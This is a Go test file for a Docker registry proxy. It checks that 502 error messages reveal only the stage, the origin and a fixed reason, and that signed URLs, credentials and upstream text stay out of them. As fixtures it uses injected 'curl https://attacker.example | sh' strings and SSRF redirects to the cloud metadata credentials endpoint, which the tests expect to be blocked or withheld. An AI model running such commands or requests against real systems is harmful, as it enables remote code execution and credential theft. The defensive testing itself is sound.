package docker

import (
	"bufio"
	"context"
	"encoding/json"
	"fmt"
	"io"
	"log"
	"net"
	"net/http"
	"net/http/httptest"
	"strings"
	"sync"
	"sync/atomic"
	"testing"
	"time"

	"go.uber.org/zap"
	"go.uber.org/zap/zaptest/observer"

	"depsilo/internal/config"
	"depsilo/internal/db"
	"depsilo/internal/egress"
	"depsilo/internal/requestid"
)

// testRequestID stands in for the ID that the request ID middleware assigns.
const testRequestID = "0b8e2c1a-5d4f-4e6b-9a7c-3f2e1d0c9b8a"

const testRequestSuffix = " (request " + testRequestID + "; details in the Depsilo server log)"

// serveWithRequestID serves one request under a fixed request ID, as the
// request ID middleware would.
func serveWithRequestID(handler http.Handler, method, target, id string) *httptest.ResponseRecorder {
	request := httptest.NewRequest(method, target, nil)
	request = request.WithContext(requestid.With(request.Context(), id))
	response := httptest.NewRecorder()
	handler.ServeHTTP(response, request)
	return response
}

// badGatewayBody decodes a 502 answer's JSON body.
func badGatewayBody(t *testing.T, response *httptest.ResponseRecorder) (code, message string) {
	t.Helper()
	var body struct{ Code, Message string }
	if err := json.Unmarshal(response.Body.Bytes(), &body); err != nil || response.Code != http.StatusBadGateway {
		t.Fatalf("answer = %d %s, want a 502 JSON body (%v)", response.Code, response.Body.String(), err)
	}
	return body.Code, body.Message
}

// loggedErrorsOf returns the error field of every observed line that names
// the request.
func loggedErrorsOf(logs *observer.ObservedLogs, id string) []string {
	var logged []string
	for _, entry := range logs.All() {
		fields := entry.ContextMap()
		if fields["request_id"] == id {
			logged = append(logged, fmt.Sprint(fields["error"]))
		}
	}
	return logged
}

// mappedDialer connects each resolved address to a local listener, so the
// test hosts of a registry client reach local servers through its guard.
type mappedDialer map[string]string

func (targets mappedDialer) DialContext(ctx context.Context, network, address string) (net.Conn, error) {
	target, ok := targets[address]
	if !ok {
		return nil, fmt.Errorf("unexpected dial to %s", address)
	}
	var dialer net.Dialer
	return dialer.DialContext(ctx, network, target)
}

// closedAddress is a local address that refuses connections.
func closedAddress(t *testing.T) string {
	t.Helper()
	listener, err := net.Listen("tcp", "127.0.0.1:0")
	if err != nil {
		t.Fatal(err)
	}
	address := listener.Addr().String()
	_ = listener.Close()
	return address
}

func redirectTo(location string) http.HandlerFunc {
	return func(w http.ResponseWriter, request *http.Request) {
		if request.URL.Path == "/v2/" {
			w.WriteHeader(http.StatusOK)
			return
		}
		w.Header().Set("Location", location)
		w.WriteHeader(http.StatusTemporaryRedirect)
	}
}

func answerWith(status int, body string) http.HandlerFunc {
	return func(w http.ResponseWriter, request *http.Request) {
		if request.URL.Path == "/v2/" {
			w.WriteHeader(http.StatusOK)
			return
		}
		w.WriteHeader(status)
		_, _ = io.WriteString(w, body)
	}
}

func challengeWith(header string) http.HandlerFunc {
	return func(w http.ResponseWriter, _ *http.Request) {
		w.Header().Set("Www-Authenticate", header)
		w.WriteHeader(http.StatusUnauthorized)
	}
}

// fakeIPNotCarriedReason follows the placeholder in the 502 reason of a
// fake-IP answer that a registry without a proxy dialed and that nothing
// carried.
const fakeIPNotCarriedReason = ", a fake-IP address from proxy software, but nothing carried the connection to it; " +
	"turn on the proxy software's TUN mode, " +
	"or set [egress] upstream_proxy or DEPSILO_EGRESS_UPSTREAM_PROXY to its HTTP port and restart, " +
	"see docs/deployment.md#upstream-network-egress"

// A 502 body names the stage, the origin of the hop that failed and a reason
// from a fixed vocabulary. A signed URL's path and query, response bodies and
// registry error messages stay out of it; the server log keeps them, with the
// URL query values redacted.
func TestBadGatewayMessageNamesOnlyTheStageOriginAndReason(t *testing.T) {
	const blob = "/v2/library/widget/blobs/sha256:4f1e"
	const manifest = "/v2/library/widget/manifests/latest"
	for _, tt := range []struct {
		name     string
		path     string
		registry http.HandlerFunc
		// hosts are further servers, and refused hosts refuse connections.
		hosts         map[string]http.HandlerFunc
		refused       []string
		want          string
		hidden        []string
		wantLogged    []string
		hiddenFromLog []string
	}{
		{
			name: "signed CDN redirect whose connection is refused",
			path: blob,
			registry: redirectTo("http://cdn.example/registry-v2/docker/registry/v2/blobs/sha256/4f/4f1e/data" +
				"?Expires=1763400000&Signature=SECRET-SIGNATURE~abc&Key-Pair-Id=K2EXAMPLEKEY"),
			refused: []string{"cdn.example"},
			want:    "blob failed at http://cdn.example: connection_refused",
			hidden:  []string{"/registry-v2", "?", "Expires", "SECRET-SIGNATURE", "K2EXAMPLEKEY"},
			wantLogged: []string{`Get "http://cdn.example/registry-v2/docker/registry/v2/blobs/sha256/4f/4f1e/data` +
				`?Expires=REDACTED&Signature=REDACTED&Key-Pair-Id=REDACTED": `},
			hiddenFromLog: []string{"SECRET-SIGNATURE", "K2EXAMPLEKEY", "1763400000"},
		},
		{
			name:          "redirect to the metadata service",
			path:          blob,
			registry:      redirectTo("http://169.254.169.254/latest/meta-data/iam/security-credentials/?token=METADATA-SECRET"),
			want:          "blob failed at http://169.254.169.254: unsafe Docker redirect target",
			hidden:        []string{"/latest", "?", "METADATA-SECRET"},
			wantLogged:    []string{"/latest/meta-data/iam/security-credentials/?token=REDACTED"},
			hiddenFromLog: []string{"METADATA-SECRET"},
		},
		{
			name:          "scheme-relative redirect to the metadata service",
			path:          blob,
			registry:      redirectTo("//169.254.169.254/latest/meta-data/?token=METADATA-SECRET"),
			want:          "blob failed at http://169.254.169.254: unsafe Docker redirect target",
			hidden:        []string{"/latest", "METADATA-SECRET"},
			hiddenFromLog: []string{"METADATA-SECRET"},
		},
		{
			// Go quotes a Location it cannot parse, twice, in its error.
			name:          "relative redirect whose Location cannot be parsed",
			path:          blob,
			registry:      redirectTo("/blob%zz?Signature=SECRET-SIGNATURE"),
			want:          "blob failed at http://registry.example: network",
			hidden:        []string{"%zz", "SECRET-SIGNATURE", "Location"},
			wantLogged:    []string{`failed to parse Location header "/blob%zz?Signature=REDACTED": parse "/blob%zz?Signature=REDACTED"`},
			hiddenFromLog: []string{"SECRET-SIGNATURE"},
		},
		{
			name:     "scheme-relative redirect with userinfo whose Location cannot be parsed",
			path:     blob,
			registry: redirectTo("//operator:SECRET-PASSWORD@cdn.example/%zz?Signature=SECRET-SIGNATURE"),
			want:     "blob failed at http://registry.example: network",
			hidden:   []string{"cdn.example", "operator", "SECRET-PASSWORD", "SECRET-SIGNATURE"},
			wantLogged: []string{`failed to parse Location header "//cdn.example/%zz?Signature=REDACTED": ` +
				`parse "//cdn.example/%zz?Signature=REDACTED"`},
			hiddenFromLog: []string{"operator", "SECRET-PASSWORD", "SECRET-SIGNATURE"},
		},
		{
			name: "registry error whose message JSON-escapes a signed URL",
			path: manifest,
			registry: answerWith(http.StatusInternalServerError,
				`{"errors":[{"code":"UNKNOWN","message":"see https:\/\/cdn.example\/x?Signature=SECRET-SIGNATURE"}]}`),
			want:          "manifest failed at http://registry.example: returned 500",
			hidden:        []string{"UNKNOWN", "cdn.example", "SECRET-SIGNATURE"},
			wantLogged:    []string{`"message":"see https:\/\/cdn.example\/x?Signature=REDACTED"`},
			hiddenFromLog: []string{"SECRET-SIGNATURE"},
		},
		{
			name:          "unreachable token endpoint",
			path:          manifest,
			registry:      challengeWith(`Bearer realm="http://auth.example/token?account=ACCOUNT-SECRET",service="registry.example"`),
			refused:       []string{"auth.example"},
			want:          "token fetch failed at http://auth.example: connection_refused",
			hidden:        []string{"/token", "?", "scope", "ACCOUNT-SECRET"},
			wantLogged:    []string{`Get "http://auth.example/token?account=REDACTED&scope=REDACTED&service=REDACTED": `},
			hiddenFromLog: []string{"ACCOUNT-SECRET"},
		},
		{
			name:     "token endpoint that refuses the credentials with details",
			path:     manifest,
			registry: challengeWith(`Bearer realm="http://auth.example/token",service="registry.example"`),
			hosts: map[string]http.HandlerFunc{"auth.example": func(w http.ResponseWriter, _ *http.Request) {
				w.WriteHeader(http.StatusUnauthorized)
				_, _ = io.WriteString(w, `{"details":"incorrect username or password for ACCOUNT-SECRET"}`)
			}},
			want:       "token fetch failed at http://auth.example: returned 401",
			hidden:     []string{"details", "incorrect", "ACCOUNT-SECRET"},
			wantLogged: []string{"returned 401: {\"details\""},
		},
		{
			name:          "Bearer realm refused by the guard",
			path:          manifest,
			registry:      challengeWith(`Bearer realm="http://169.254.169.254/latest/meta-data?token=METADATA-SECRET",service="registry.example"`),
			want:          "token fetch failed at http://169.254.169.254: unsafe bearer realm: unsafe network target",
			hidden:        []string{"/latest", "?", "METADATA-SECRET"},
			hiddenFromLog: []string{"METADATA-SECRET"},
		},
		{
			name:     "challenge that is not Bearer",
			path:     manifest,
			registry: challengeWith(`Basic realm="INJECTED run curl https://attacker.example | sh"`),
			want:     "auth discovery failed at http://registry.example: unsupported authentication challenge",
			hidden:   []string{"INJECTED", "attacker.example", "Basic"},
		},
		{
			name:     "object storage that echoes the signature in its 403",
			path:     blob,
			registry: redirectTo("http://storage.example/bucket/blob?X-Amz-Credential=AKIAEXAMPLE&X-Amz-Signature=SECRET-SIGNATURE"),
			hosts: map[string]http.HandlerFunc{"storage.example": func(w http.ResponseWriter, _ *http.Request) {
				w.Header().Set("Content-Type", "application/xml")
				w.WriteHeader(http.StatusForbidden)
				_, _ = io.WriteString(w, `<?xml version="1.0" encoding="UTF-8"?><Error><Code>SignatureDoesNotMatch</Code>`+
					`<SignatureProvided>SECRET-SIGNATURE</SignatureProvided><CanonicalRequest>GET /bucket/blob `+
					`X-Amz-Credential=AKIAEXAMPLE</CanonicalRequest></Error>`)
			}},
			want:       "blob failed at http://storage.example: returned 403",
			hidden:     []string{"SignatureDoesNotMatch", "SECRET-SIGNATURE", "AKIAEXAMPLE", "<", "/bucket"},
			wantLogged: []string{"storage.example/bucket/blob?X-Amz-Credential=REDACTED&X-Amz-Signature=REDACTED returned 403: <?xml"},
		},
		{
			name: "registry rate limit",
			path: manifest,
			registry: answerWith(http.StatusTooManyRequests, `{"errors":[{"code":"TOOMANYREQUESTS",`+
				`"message":"You have reached your pull rate limit, see https://docs.example/limits?account=ACCOUNT-SECRET"}]}`),
			want:          "manifest failed at http://registry.example: returned 429 (TOOMANYREQUESTS)",
			hidden:        []string{"pull rate limit", "docs.example", "ACCOUNT-SECRET"},
			wantLogged:    []string{"pull rate limit, see https://docs.example/limits?account=REDACTED"},
			hiddenFromLog: []string{"ACCOUNT-SECRET"},
		},
		{
			name: "tag list answered with an HTML error page",
			path: "/v2/library/widget/tags/list?n=10&last=TAG-CURSOR",
			registry: answerWith(http.StatusInternalServerError,
				"<html><body><h1>upstream error at internal-host.corp.example</h1></body></html>"),
			want:       "tag list failed at http://registry.example: returned 500",
			hidden:     []string{"<", "internal-host", "TAG-CURSOR", "?"},
			wantLogged: []string{"tags/list?n=REDACTED&last=REDACTED returned 500: <html>"},
		},
	} {
		t.Run(tt.name, func(t *testing.T) {
			registry := httptest.NewServer(tt.registry)
			t.Cleanup(registry.Close)
			answers := staticIPResolver{"registry.example": {{IP: net.ParseIP("93.184.216.34")}}}
			dialer := mappedDialer{"93.184.216.34:80": registry.Listener.Addr().String()}
			next := 35
			for host, handle := range tt.hosts {
				server := httptest.NewServer(handle)
				t.Cleanup(server.Close)
				address := fmt.Sprintf("93.184.216.%d", next)
				answers[host] = []net.IPAddr{{IP: net.ParseIP(address)}}
				dialer[address+":80"] = server.Listener.Addr().String()
				next++
			}
			for _, host := range tt.refused {
				address := fmt.Sprintf("93.184.216.%d", next)
				answers[host] = []net.IPAddr{{IP: net.ParseIP(address)}}
				dialer[address+":80"] = closedAddress(t)
				next++
			}
			core, logs := observer.New(zap.ErrorLevel)
			t.Cleanup(zap.ReplaceGlobals(zap.New(core)))
			router, _ := newRoutedDockerRouter(t, config.RegistryConfig{Name: "hub", URL: "http://registry.example"},
				egress.Policy{}, answers, dialer.DialContext, false)

			response := serveWithRequestID(router, http.MethodGet, tt.path, testRequestID)
			code, message := badGatewayBody(t, response)
			if want := tt.want + testRequestSuffix; code != "UPSTREAM_UNAVAILABLE" || message != want {
				t.Fatalf("answer = %s %q, want UPSTREAM_UNAVAILABLE %q", code, message, want)
			}
			for _, hidden := range tt.hidden {
				if strings.Contains(strings.TrimSuffix(message, testRequestSuffix), hidden) {
					t.Errorf("502 message %q contains %q", message, hidden)
				}
			}

			logged := loggedErrorsOf(logs, testRequestID)
			if len(logged) != 1 {
				t.Fatalf("errors logged under request %s = %q, want one", testRequestID, logged)
			}
			for _, want := range tt.wantLogged {
				if !strings.Contains(logged[0], want) {
					t.Errorf("logged error %q lacks %q", logged[0], want)
				}
			}
			for _, hidden := range tt.hiddenFromLog {
				if strings.Contains(logged[0], hidden) {
					t.Errorf("logged error %q contains %q", logged[0], hidden)
				}
			}
		})
	}
}

// A 502 for unique-local IPv6 fake-IP names the host, the documented range of
// proxy software or only "a unique-local address", and the remedy, through a
// proxy and without one. Every address, which may be an internal network's,
// stays in the server log.
func TestBadGatewayExplainsUniqueLocalFakeIPWithoutItsAddresses(t *testing.T) {
	for _, tt := range []struct {
		name    string
		answers staticIPResolver
		want    string
		hidden  []string
		logged  string
	}{
		{
			name: "redirect target answered with a placeholder and another unique-local address",
			answers: staticIPResolver{
				"registry.example": dnsAnswer("93.184.216.34"),
				"cdn.example":      dnsAnswer("198.18.0.12", "fd12:3456:789a::5"),
			},
			want: "blob failed at http://cdn.example: cdn.example resolved to fake-IP addresses and a unique-local address, " +
				"which Depsilo cannot tell from a private network; " +
				"set the proxy software's IPv6 fake-IP range (fake-ip-range6 or inet6_range) to 2001:2::/48 " +
				"or turn IPv6 fake-IP off, see docs/deployment.md#upstream-network-egress",
			hidden: []string{"fd12", "198.18.0.12", "SECRET-SIGNATURE"},
			logged: "(DNS answer: 198.18.0.12, fd12:3456:789a::5)",
		},
	} {
		for _, route := range []string{egressRouteDefaultProxy, egressRouteDirect} {
			t.Run(route+"/"+tt.name, func(t *testing.T) {
				handle := redirectTo("http://cdn.example/registry-v2/data?Signature=SECRET-SIGNATURE")
				policy := egress.Policy{}
				var dialContext func(context.Context, string, string) (net.Conn, error)
				if route == egressRouteDefaultProxy {
					proxy := newRecordingProxy(t, handle)
					var err error
					if policy, err = egress.NewPolicy(proxy.URL, nil, nil); err != nil {
						t.Fatal(err)
					}
					dialContext = (&routedDialer{proxies: map[string]bool{proxy.address(): true}}).DialContext
				} else {
					registry := httptest.NewServer(handle)
					t.Cleanup(registry.Close)
					dialContext = mappedDialer{"93.184.216.34:80": registry.Listener.Addr().String()}.DialContext
				}
				core, logs := observer.New(zap.ErrorLevel)
				t.Cleanup(zap.ReplaceGlobals(zap.New(core)))
				router, _ := newRoutedDockerRouter(t, config.RegistryConfig{Name: "hub", URL: "http://registry.example"},
					policy, tt.answers, dialContext, false)

				response := serveWithRequestID(router, http.MethodGet, "/v2/library/widget/blobs/sha256:4f1e", testRequestID)
				code, message := badGatewayBody(t, response)
				if want := tt.want + testRequestSuffix; code != "UPSTREAM_UNAVAILABLE" || message != want {
					t.Fatalf("answer = %s %q, want UPSTREAM_UNAVAILABLE %q", code, message, want)
				}
				for _, hidden := range tt.hidden {
					if strings.Contains(message, hidden) {
						t.Errorf("502 message %q contains %q", message, hidden)
					}
				}
				logged := loggedErrorsOf(logs, testRequestID)
				if len(logged) != 1 || !strings.Contains(logged[0], tt.logged) {
					t.Fatalf("errors logged under request %s = %q, want one containing %q", testRequestID, logged, tt.logged)
				}
			})
		}
	}
}

// waitingContext is a request context that reports when its request first
// waits on it. A request that joins another's inflight cache fill or token
// discovery first waits on its context while it waits for the shared result,
// so a test can hold the leader until the follower has joined.
type waitingContext struct {
	context.Context
	once    sync.Once
	waiting chan struct{}
}

func newWaitingContext() *waitingContext {
	return &waitingContext{Context: context.Background(), waiting: make(chan struct{})}
}

func (ctx *waitingContext) Done() <-chan struct{} {
	ctx.once.Do(func() { close(ctx.waiting) })
	return ctx.Context.Done()
}

func waitFor(t *testing.T, ready <-chan struct{}, what string) {
	t.Helper()
	select {
	case <-ready:
	case <-time.After(10 * time.Second):
		t.Fatalf("timed out waiting for %s", what)
	}
}

// Requests that share one failure, through an inflight cache fill or a token
// discovery, read the leader's error. Each 502 still names its own request,
// and each request leaves its own error line and access-log entry.
func TestBadGatewayNamesEachRequestThatSharesAFailure(t *testing.T) {
	for _, tt := range []struct {
		name   string
		method string
		path   string
		// held is the upstream path that waits until the follower has joined.
		held     string
		answer   http.HandlerFunc
		wantCode string
		want     string
	}{
		{
			name:   "blob GETs that share one cache fill",
			method: http.MethodGet,
			path:   "/v2/library/widget/blobs/sha256:4f1e",
			held:   "/v2/library/widget/blobs/sha256:4f1e",
			answer: func(w http.ResponseWriter, _ *http.Request) {
				w.WriteHeader(http.StatusTooManyRequests)
				_, _ = io.WriteString(w, `{"errors":[{"code":"TOOMANYREQUESTS","message":"slow down"}]}`)
			},
			wantCode: "UPSTREAM_UNAVAILABLE",
			want:     "blob failed at http://registry.example: returned 429 (TOOMANYREQUESTS)",
		},
		{
			name:     "manifest HEADs that share one token discovery",
			method:   http.MethodHead,
			path:     "/v2/library/widget/manifests/sha256:4f1e",
			held:     "/v2/",
			answer:   func(w http.ResponseWriter, _ *http.Request) { w.WriteHeader(http.StatusUnauthorized) },
			wantCode: "AUTH_FAILED",
			want:     "auth discovery failed at http://registry.example: no WWW-Authenticate header",
		},
	} {
		t.Run(tt.name, func(t *testing.T) {
			var heldRequests atomic.Int64
			arrived, release := make(chan struct{}), make(chan struct{})
			var releaseOnce sync.Once
			registry := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, request *http.Request) {
				if request.URL.Path != tt.held {
					w.WriteHeader(http.StatusOK)
					return
				}
				if heldRequests.Add(1) == 1 {
					close(arrived)
				}
				<-release
				tt.answer(w, request)
			}))
			t.Cleanup(registry.Close)
			t.Cleanup(func() { releaseOnce.Do(func() { close(release) }) })
			core, logs := observer.New(zap.ErrorLevel)
			t.Cleanup(zap.ReplaceGlobals(zap.New(core)))
			router, database := newRoutedDockerRouter(t, config.RegistryConfig{Name: "hub", URL: "http://registry.example"},
				egress.Policy{}, staticIPResolver{"registry.example": {{IP: net.ParseIP("93.184.216.34")}}},
				mappedDialer{"93.184.216.34:80": registry.Listener.Addr().String()}.DialContext, false)
			serve := func(ctx context.Context, id string) <-chan *httptest.ResponseRecorder {
				answered := make(chan *httptest.ResponseRecorder, 1)
				go func() {
					request := httptest.NewRequest(tt.method, tt.path, nil)
					response := httptest.NewRecorder()
					router.ServeHTTP(response, request.WithContext(requestid.With(ctx, id)))
					answered <- response
				}()
				return answered
			}

			leader := serve(context.Background(), "leader-id")
			waitFor(t, arrived, "the leader's upstream request")
			joined := newWaitingContext()
			follower := serve(joined, "follower-id")
			waitFor(t, joined.waiting, "the follower to wait for the leader's result")
			releaseOnce.Do(func() { close(release) })

			for _, request := range []struct {
				id       string
				answered <-chan *httptest.ResponseRecorder
			}{{"leader-id", leader}, {"follower-id", follower}} {
				var response *httptest.ResponseRecorder
				select {
				case response = <-request.answered:
				case <-time.After(10 * time.Second):
					t.Fatalf("request %s got no answer", request.id)
				}
				code, message := badGatewayBody(t, response)
				want := tt.want + " (request " + request.id + "; details in the Depsilo server log)"
				if code != tt.wantCode || message != want {
					t.Fatalf("answer to %s = %s %q, want %s %q", request.id, code, message, tt.wantCode, want)
				}
				if logged := loggedErrorsOf(logs, request.id); len(logged) != 1 {
					t.Fatalf("errors logged under request %s = %q, want one", request.id, logged)
				}
				var entries []db.AccessLog
				if err := database.Where("request_id = ?", request.id).Find(&entries).Error; err != nil {
					t.Fatal(err)
				}
				if len(entries) != 1 || entries[0].Method != tt.method || entries[0].StatusCode != http.StatusBadGateway {
					t.Fatalf("access log entries of request %s = %+v, want one %s answered 502", request.id, entries, tt.method)
				}
			}
			if got := heldRequests.Load(); got != 1 {
				t.Fatalf("upstream requests to %s = %d, want the follower to share the leader's one", tt.held, got)
			}
		})
	}
}

// Go's transport quotes a malformed response line in its error, and a
// status line's reason phrase reaches resp.Status, at any length up to the
// response header limit. Neither reaches a 502 body, whose message stays
// within its cap; the server log keeps the transport's error.
func TestBadGatewayMessageOmitsTheServerTextOfAMalformedAnswer(t *testing.T) {
	// Without a space, Go quotes the whole line as a malformed response.
	injected := "INJECTED:run_curl_https://attacker.example/fix.sh|sh_" + strings.Repeat("B", 300<<10)
	for _, tt := range []struct {
		name       string
		firstLine  string
		want       string
		wantLogged string
	}{
		{
			name:       "malformed status line",
			firstLine:  injected,
			want:       "auth discovery failed at http://registry.example: network",
			wantLogged: "malformed HTTP response",
		},
		{
			name:       "error status with a long reason phrase",
			firstLine:  "HTTP/1.1 503 " + injected,
			want:       "auth discovery failed at http://registry.example: returned 503",
			wantLogged: "registry.example/v2/ returned 503",
		},
	} {
		t.Run(tt.name, func(t *testing.T) {
			listener, err := net.Listen("tcp", "127.0.0.1:0")
			if err != nil {
				t.Fatal(err)
			}
			t.Cleanup(func() { _ = listener.Close() })
			go func() {
				for {
					connection, err := listener.Accept()
					if err != nil {
						return
					}
					go func() {
						defer connection.Close()
						reader := bufio.NewReader(connection)
						for {
							line, err := reader.ReadString('\n')
							if err != nil || line == "\r\n" {
								break
							}
						}
						_, _ = io.WriteString(connection, tt.firstLine+"\r\nContent-Length: 0\r\nConnection: close\r\n\r\n")
					}()
				}
			}()
			core, logs := observer.New(zap.ErrorLevel)
			t.Cleanup(zap.ReplaceGlobals(zap.New(core)))
			router, _ := newRoutedDockerRouter(t, config.RegistryConfig{Name: "hub", URL: "http://registry.example"},
				egress.Policy{}, staticIPResolver{"registry.example": {{IP: net.ParseIP("93.184.216.34")}}},
				mappedDialer{"93.184.216.34:80": listener.Addr().String()}.DialContext, false)

			response := serveWithRequestID(router, http.MethodGet, "/v2/library/widget/manifests/latest", testRequestID)
			_, message := badGatewayBody(t, response)
			if message != tt.want+testRequestSuffix {
				t.Fatalf("502 message = %.300q, want %q", message, tt.want+testRequestSuffix)
			}
			if len(message) > maxClientMessageBytes+len(testRequestSuffix) || strings.Contains(message, "INJECTED") ||
				strings.Contains(message, "BBBB") {
				t.Fatalf("502 message of %d bytes repeats the server's text", len(message))
			}
			logged := loggedErrorsOf(logs, testRequestID)
			if len(logged) != 1 || !strings.Contains(logged[0], tt.wantLogged) {
				t.Fatalf("logged error = %.300q, want one containing %q", logged, tt.wantLogged)
			}
		})
	}
}

// A proxy that refuses CONNECT answers with its own status text, which Go
// would return as the error. The 502 names the refused target's origin and
// the status code only, for the registry's own proxy and for the [egress]
// default proxy, and for a Bearer realm as for a blob redirect.
func TestBadGatewayNamesTheTargetThatTheProxyRefusedToConnect(t *testing.T) {
	const signedBlob = "https://cdn.example/registry-v2/blobs/sha256/4f/4f1e/data?Expires=1763400000&Signature=SECRET-SIGNATURE"
	newRefusingProxy := func(t *testing.T, challenge bool) *recordingProxy {
		t.Helper()
		return newRecordingProxy(t, func(w http.ResponseWriter, request *http.Request) {
			if request.Method == http.MethodConnect {
				connection, buffered, err := http.NewResponseController(w).Hijack()
				if err != nil {
					t.Errorf("hijack CONNECT: %v", err)
					return
				}
				defer connection.Close()
				_, _ = buffered.WriteString("HTTP/1.1 403 Blocked by policy CANARY-PHRASE\r\nContent-Length: 0\r\n\r\n")
				_ = buffered.Flush()
				return
			}
			switch {
			case request.URL.Path == "/v2/" && challenge:
				w.Header().Set("Www-Authenticate", `Bearer realm="https://auth.example/token",service="registry.example"`)
				w.WriteHeader(http.StatusUnauthorized)
			case request.URL.Path == "/v2/":
				w.WriteHeader(http.StatusOK)
			default:
				w.Header().Set("Location", signedBlob)
				w.WriteHeader(http.StatusTemporaryRedirect)
			}
		})
	}
	answers := staticIPResolver{
		"registry.example": {{IP: net.ParseIP("93.184.216.34")}},
		"cdn.example":      {{IP: net.ParseIP("93.184.216.35")}},
		"auth.example":     {{IP: net.ParseIP("93.184.216.36")}},
	}
	for _, route := range []string{egressRouteOwnProxy, egressRouteDefaultProxy} {
		for _, tt := range []struct {
			name      string
			challenge bool
			path      string
			want      string
		}{
			{
				name: "blob redirect",
				path: "/v2/library/widget/blobs/sha256:4f1e",
				want: "blob failed at https://cdn.example: egress proxy refused CONNECT (403)",
			},
			{
				name:      "Bearer realm",
				challenge: true,
				path:      "/v2/library/widget/manifests/latest",
				want:      "token fetch failed at https://auth.example: egress proxy refused CONNECT (403)",
			},
		} {
			t.Run(route+"/"+tt.name, func(t *testing.T) {
				proxy := newRefusingProxy(t, tt.challenge)
				registry := config.RegistryConfig{Name: "hub", URL: "http://registry.example"}
				policy := egress.Policy{}
				if route == egressRouteOwnProxy {
					registry.Proxy = proxy.URL
				} else {
					var err error
					if policy, err = egress.NewPolicy(proxy.URL, nil, nil); err != nil {
						t.Fatal(err)
					}
				}
				dialer := &routedDialer{proxies: map[string]bool{proxy.address(): true}}
				router, _ := newRoutedDockerRouter(t, registry, policy, answers, dialer.DialContext, false)

				response := serveWithRequestID(router, http.MethodGet, tt.path, testRequestID)
				_, message := badGatewayBody(t, response)
				if message != tt.want+testRequestSuffix {
					t.Fatalf("502 message = %q, want %q", message, tt.want+testRequestSuffix)
				}
				for _, hidden := range []string{"CANARY-PHRASE", "Blocked", "Forbidden", proxy.address(), "SECRET-SIGNATURE"} {
					if strings.Contains(message, hidden) {
						t.Fatalf("502 message %q contains %q", message, hidden)
					}
				}
				if got := dialer.directDials(); len(got) != 0 {
					t.Fatalf("direct dials = %v, want every request through the proxy", got)
				}
			})
		}
	}
}

// The hints that a failure of the [egress] default proxy adds to a 502 reason.
// The registry's own host keeps its pinned network scope until a restart.
func fakeIPProxyHintFor(host string) string {
	return "; if " + host + " is on your network, give it a real DNS answer, for example with fake-ip-filter in the proxy software, " +
		"so that Depsilo connects to it directly after a restart, see docs/deployment.md#upstream-network-egress"
}

func fakeIPProxyHintForOtherHost(host string) string {
	return "; if " + host + " is on your network, give it a real DNS answer, for example with fake-ip-filter in the proxy software, " +
		"so that Depsilo connects to it directly, see docs/deployment.md#upstream-network-egress"
}

func noProxyHintFor(host string) string {
	return "; if " + host + " is reachable only without the proxy, list it in [egress] no_proxy and restart, " +
		"see docs/deployment.md#upstream-network-egress"
}

// refuseConnect is a proxy that refuses every CONNECT with status and passes
// plain-http requests to plain.
func refuseConnect(status int, plain http.HandlerFunc) http.HandlerFunc {
	return func(w http.ResponseWriter, request *http.Request) {
		if request.Method == http.MethodConnect {
			w.WriteHeader(status)
			return
		}
		plain(w, request)
	}
}

// closeTunnel is a proxy that accepts CONNECT and closes the tunnel at once,
// as mihomo does for a host it cannot reach.
func closeTunnel(t *testing.T) http.HandlerFunc {
	return func(w http.ResponseWriter, request *http.Request) {
		connection, buffered, err := http.NewResponseController(w).Hijack()
		if err != nil {
			t.Errorf("hijack CONNECT: %v", err)
			return
		}
		_, _ = buffered.WriteString("HTTP/1.1 200 Connection established\r\n\r\n")
		_ = buffered.Flush()
		_ = connection.Close()
	}
}

// gatewayAnswer answers a plain-http request with status and an error page
// that names a signed URL.
func gatewayAnswer(status int) http.HandlerFunc {
	return func(w http.ResponseWriter, _ *http.Request) {
		w.WriteHeader(status)
		_, _ = io.WriteString(w, "<html>cannot reach http://upstream.example/x?token=PROXY-SECRET</html>")
	}
}

// tunnelTo is a proxy that accepts every CONNECT and carries the tunnel to
// address, whichever host the client named.
func tunnelTo(t *testing.T, address string) http.HandlerFunc {
	return func(w http.ResponseWriter, request *http.Request) {
		if request.Method != http.MethodConnect {
			http.Error(w, "plain request to a tunneling proxy", http.StatusBadRequest)
			return
		}
		target, err := net.Dial("tcp", address)
		if err != nil {
			t.Errorf("dial tunnel target: %v", err)
			w.WriteHeader(http.StatusBadGateway)
			return
		}
		defer target.Close()
		connection, buffered, err := http.NewResponseController(w).Hijack()
		if err != nil {
			t.Errorf("hijack CONNECT: %v", err)
			return
		}
		defer connection.Close()
		_, _ = buffered.WriteString("HTTP/1.1 200 Connection established\r\n\r\n")
		_ = buffered.Flush()
		go func() {
			_, _ = io.Copy(target, buffered.Reader)
			_ = target.Close()
		}()
		_, _ = io.Copy(connection, target)
	}
}

// A request that the [egress] default proxy failed to carry gets a hint in
// its 502 reason: for a host whose local answer was fake-IP, when the proxy
// refused CONNECT, the connection through it failed, for example because the
// proxy closed the tunnel, or it answered plain http with 502, 503 or 504, a
// real DNS answer; for the registry's own host answered publicly, when the
// proxy refused CONNECT or answered with such a status, no_proxy. A hint
// names its host as the 502 body names the origin. A TLS failure, the
// registry's own proxy and the direct leg give no hint (a proxy that cannot
// be reached: TestUnreachableProxyAddressStaysOutOfTheBadGatewayBody), and no
// 502 names the proxy, the proxy's text or an address of the answer.
func TestBadGatewayHintsWhyTheDefaultProxyFailed(t *testing.T) {
	const manifest = "/v2/library/widget/manifests/latest"
	const blob = "/v2/library/widget/blobs/sha256:4f1e"
	fakeIPAnswers := staticIPResolver{"registry.home.lan": dnsAnswer("198.18.0.10", "2001:2::a")}
	publicAnswers := staticIPResolver{"registry.example": dnsAnswer("93.184.216.34")}
	// untrusted is an https server whose certificate registry clients do not
	// trust.
	untrusted := httptest.NewUnstartedServer(http.HandlerFunc(func(w http.ResponseWriter, _ *http.Request) {
		w.WriteHeader(http.StatusOK)
	}))
	untrusted.Config.ErrorLog = log.New(io.Discard, "", 0)
	untrusted.StartTLS()
	t.Cleanup(untrusted.Close)
	for _, tt := range []struct {
		name     string
		registry string
		// own makes the proxy the registry's own.
		own     bool
		answers staticIPResolver
		proxy   http.HandlerFunc
		// direct serves the direct dials; nil refuses them.
		direct http.HandlerFunc
		path   string
		// want is the 502 message before its request suffix. With
		// transportCode, its %s is the failure code of a closed tunnel.
		want          string
		transportCode bool
	}{
		{
			name:     "CONNECT refused for a fake-IP answer",
			registry: "https://registry.home.lan",
			answers:  fakeIPAnswers,
			proxy:    refuseConnect(http.StatusBadGateway, nil),
			path:     manifest,
